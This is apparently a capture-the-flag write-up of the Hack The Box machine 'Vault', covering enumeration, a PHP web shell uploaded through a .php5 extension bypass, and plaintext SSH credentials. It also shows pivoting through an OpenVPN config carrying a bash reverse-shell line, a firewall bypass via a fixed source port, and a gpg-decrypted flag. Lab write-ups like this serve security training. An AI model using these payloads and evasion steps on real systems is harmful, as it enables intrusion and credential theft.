---
layout: single
title: Vault - Hack The Box
excerpt: This is the writeup for Vault, a machine with pivoting across different network segments.
date: 2019-04-06
classes: wide
header:
  teaser: /assets/images/htb-writeup-vault/vault_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - php
  - openvpn
  - firewall
  - pivoting
  - gpg
---

![](/assets/images/htb-writeup-vault/vault_logo.png)

## Quick summary

- An upload page allows us to get RCE by uploading a PHP file with the `php5` file extension
- We can find the SSH credentials in a plaintext file in Dave's directory
- After getting a foothold on the box, we find another network segment with another machine on it
- The machine has OpenVPN installed and already has a backdoored `ovpn` configuration file that let us get a reverse shell there
- There's yet another network segment and host that we discover by looking at the routing table and host file
- The next target is protected by a firewall but the firewall allows us to connect through it by changing the source port of our TCP session
- After logging in to the last box we find a gpg encrypted file which we can decrypt on the host OS since we have the private key and the password

## Detailed steps

### Nmap

Port 22 and 80 are open:

```
# Nmap 7.70 scan initiated Sat Nov  3 23:09:53 2018 as: nmap -F -sC -sV -oA vault 10.10.10.109
Nmap scan report for vault.htb (10.10.10.109)
Host is up (0.023s latency).
Not shown: 98 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web enumeration

There's not much on the main page except a mention about `Sparklays`

![](/assets/images/htb-writeup-vault/web.png)

A gobuster scan with `big.txt` in the root directory reveals nothing but if we start with `/sparklays` we find a few directories:

```
# gobuster -q -t 50 -w big.txt -u http://vault.htb -s 200,204,301,302,307

# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays -s 200,204,301,302,307
/design (Status: 301)

# gobuster -q -t 50 -w big.txt -u http://vault.htb/sparklays/design -s 200,204,301,302,307
/uploads (Status: 301)
```

Further scanning with `raft-small-words` and `.html` extension reveals `design.html`:

```
# gobuster -q -t 50 -w raft-small-words.txt -u http://vault.htb/sparklays/design -x php,html -s 200,204,301,302,307
/uploads (Status: 301)
/design.html (Status: 200)
```

![](/assets/images/htb-writeup-vault/design.png)

The link goes to an upload page. Upload pages are interesting because if we can upload a PHP file then we can get RCE on the target machine.

![](/assets/images/htb-writeup-vault/changelogo.png)

I used a simple PHP command shell:

```php
<html><head></head><body><pre>
<?php system($_GET["cmd"]); ?>
</pre></body></html>
```

When we try to upload a simple PHP command shell we get a `sorry that file type is not allowed` error message.

After trying a few different file types, I noticed we can use the `.php5` file extension and we get a `The file was uploaded successfully` message.

We now have RCE:

![](/assets/images/htb-writeup-vault/rce.png)

Found a couple of interesting files in Dave's desktop folder:

**http://vault.htb/sparklays/design/uploads/shell.php5?cmd=ls%20-l%20/home/dave/Desktop**
```
total 12
-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers
-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key
-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 ssh
```

The `ssh` file contains plaintext credentials:

**http://vault.htb/sparklays/design/uploads/shell.php5?cmd=cat%20/home/dave/Desktop/ssh**
```
dave
Dav3therav3123
```

### Shell access

Using the SSH credentials we found in Dave's directory we can now log in:

```
root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109
dave@10.10.10.109's password:

Last login: Sat Nov  3 19:59:05 2018 from 10.10.15.233
dave@ubuntu:~$
```

The `~/Desktop` directory contains a couple of interesting files:

```
dave@ubuntu:~/Desktop$ ls -l
total 12
-rw-rw-r-- 1 alex alex 14 Jul 17 10:31 key
-rw-rw-r-- 1 alex alex 74 Jul 17 10:30 Servers
-rw-rw-r-- 1 alex alex 20 Jul 17 10:31 ssh

dave@ubuntu:~/Desktop$ cat key
itscominghome

dave@ubuntu:~/Desktop$ cat Servers
DNS + Configurator - 192.168.122.4
Firewall - 192.168.122.5
The Vault - x

dave@ubuntu:~/Desktop$ cat ssh
dave
Dav3therav3123
```

The user also has a gpg keyring:

```
dave@ubuntu:~/.gnupg$ ls -l
total 28
drwx------ 2 dave dave 4096 Jul 17  2018 private-keys-v1.d
-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg
-rw------- 1 dave dave 2205 Jul 24  2018 pubring.gpg~
-rw------- 1 dave dave  600 Sep  3  2018 random_seed
-rw------- 1 dave dave 4879 Jul 24  2018 secring.gpg
-rw------- 1 dave dave 1280 Jul 24  2018 trustdb.gpg
```

Based on the `Servers` file it seems there are other VMs or containers running. We can confirm this also by checking the network interfaces (there's a virtual bridge interface with the same subnet mentionned in the `Server` file:

```
dave@ubuntu:~/Desktop$ ifconfig
ens33     Link encap:Ethernet  HWaddr 00:50:56:b2:8d:92
          inet addr:10.10.10.109  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: fe80::250:56ff:feb2:8d92/64 Scope:Link
          inet6 addr: dead:beef::250:56ff:feb2:8d92/64 Scope:Global
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:484701 errors:0 dropped:0 overruns:0 frame:0
          TX packets:372962 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:61423226 (61.4 MB)  TX bytes:123066398 (123.0 MB)

virbr0    Link encap:Ethernet  HWaddr fe:54:00:17:ab:49
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:34 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:2296 (2.2 KB)  TX bytes:731 (731.0 B)
```

We can do a poor man's port scan using netcat and find the host `192.168.122.4` with two ports open:

```
dave@ubuntu:~/Desktop$ nc -nv 192.168.122.4 -z 1-1000 2>&1 | grep -v failed
Connection to 192.168.122.4 22 port [tcp/*] succeeded!
Connection to 192.168.122.4 80 port [tcp/*] succeeded!
```

We'll setup SSH port forwarding so we can get to the 2nd host:

```
root@ragingunicorn:~/hackthebox/Machines/Vault# ssh dave@10.10.10.109 -L 80:192.168.122.4:80
```

![](/assets/images/htb-writeup-vault/dnsserver.png)

`dns-config.php` is an invalid link (404).

The 2nd link brings us to a VPN configuration page where we can update an ovpn file.

![](/assets/images/htb-writeup-vault/vpnconfig.png)

With gobuster, we find additional information in `/notes`:

```
# gobuster -q -t 50 -w big.txt -u http://127.0.0.1 -s 200,204,301,302,307
/notes (Status: 200)
```

![](/assets/images/htb-writeup-vault/notes.png)

We can grab `http://127.0.0.1/123.ovpn`:

```
remote 192.168.122.1
dev tun
nobind
script-security 2
up "/bin/bash -c 'bash -i >& /dev/tcp/192.168.122.1/2323 0>&1'"
```

And `http://127.0.0.1/script.sh`:

```
#!/bin/bash
sudo openvpn 123.ovpn
```

So it seems that the `123.ovpn` file contains a reverse shell payload.

We can just spawn a netcat on the box and trigger the `Test VPN` function to get a shell:

```
dave@ubuntu:~$ nc -lvnp 2323
Listening on [0.0.0.0] (family 0, port 2323)
Connection from [192.168.122.4] port 2323 [tcp/*] accepted (family 2, sport 60596)
bash: cannot set terminal process group (1131): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html# id;hostname
id;hostname
uid=0(root) gid=0(root) groups=0(root)
DNS
root@DNS:/var/www/html#
```

User flag found in Dave's directory:

```
root@DNS:/home/dave# cat user.txt
cat user.txt
a4947...
```

There's also SSH credentials in there:

```
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
```

### Priv Esc

In the web directories, there's a file that reveals two additional network segments:
- 192.168.1.0/24
- 192.168.5.0/24

```
root@DNS:/var/www/DNS# ls -la
total 20
drwxrwxr-x 3 root root 4096 Jul 17 12:46 .
drwxr-xr-x 4 root root 4096 Jul 17 12:47 ..
drwxrwxr-x 2 root root 4096 Jul 17 10:34 desktop
-rw-rw-r-- 1 root root  214 Jul 17 10:37 interfaces
-rw-rw-r-- 1 root root   27 Jul 17 10:35 visudo

root@DNS:/var/www/DNS# cat visudo
www-data ALL=NOPASSWD: ALL

root@DNS:/var/www/DNS# cat interfaces
auto ens3
iface ens3 inet static
address 192.168.122.4
netmask 255.255.255.0
up route add -net 192.168.5.0 netmask 255.255.255.0 gw 192.168.122.5
up route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.28
```

There's a route in the routing table pointing to the firewall:

```
dave@DNS:~$ netstat -rn
Kernel IP routing table
Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
192.168.5.0     192.168.122.5   255.255.255.0   UG        0 0          0 ens3
192.168.122.0   0.0.0.0         255.255.255.0   U         0 0          0 ens3
```

In the host file we can also find a reference to our next target: 192.168.5.2

```
root@DNS:/home/dave# cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       DNS
192.168.5.2     Vault
```

So, we the network topology looks like this:

![](/assets/images/htb-writeup-vault/network.png)

This network is protected by a firewall, as shown earlier in the `Servers` file we found. Nmap is already installed on the DNS VM so we can use it to scan `192.168.5.2`.

```
root@DNS:~# nmap -P0 -p 1-10000 -T5 192.168.5.2

Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 03:56 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0019s latency).
Not shown: 9998 filtered ports
PORT     STATE  SERVICE
53/tcp   closed domain
4444/tcp closed krb524

Nmap done: 1 IP address (1 host up) scanned in 243.36 seconds
```

By using the 4444 as a source port we can bypass the firewall and find another open port:

```
root@DNS:~# nmap -g 4444 -sS -P0 -p 1-1000 192.168.5.2

Starting Nmap 7.01 ( https://nmap.org ) at 2018-11-04 04:16 GMT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for Vault (192.168.5.2)
Host is up (0.0023s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
987/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 3.84 seconds
```

We'll need to SSH in by changing the source port of the TCP socket. To do that we can spawn a ncat listener that redirects to port 987 while changing the source port. Then we just SSH to ourselves on the ncat listening port.

```
root@DNS:~# ncat -l 2222 --sh-exec "ncat 192.168.5.2 987 -p 4444"
```

```
root@DNS:~# ssh -p 2222 dave@127.0.0.1  (password = dav3gerous567)

Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$ id
uid=1001(dave) gid=1001(dave) groups=1001(dave)

vault:~$ ls
root.txt.gpg
```

The only thing interesting is the `root.txt.gpg`

We can download this back to the host OS and decrypt it with the `itscominghome` key we found earlier:

```
root@DNS:/var/www/html# ncat -l 2222 --sh-exec "ncat 192.168.5.2 987 -p 4444"

dave@ubuntu:~$ scp -P 2222 dave@192.168.122.4:~/root.txt.gpg .
dave@192.168.122.4's password: 
root.txt.gpg                                                          100%  629     0.6KB/s   00:00
```

```
dave@ubuntu:~$ gpg -d root.txt.gpg

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
ca468...
```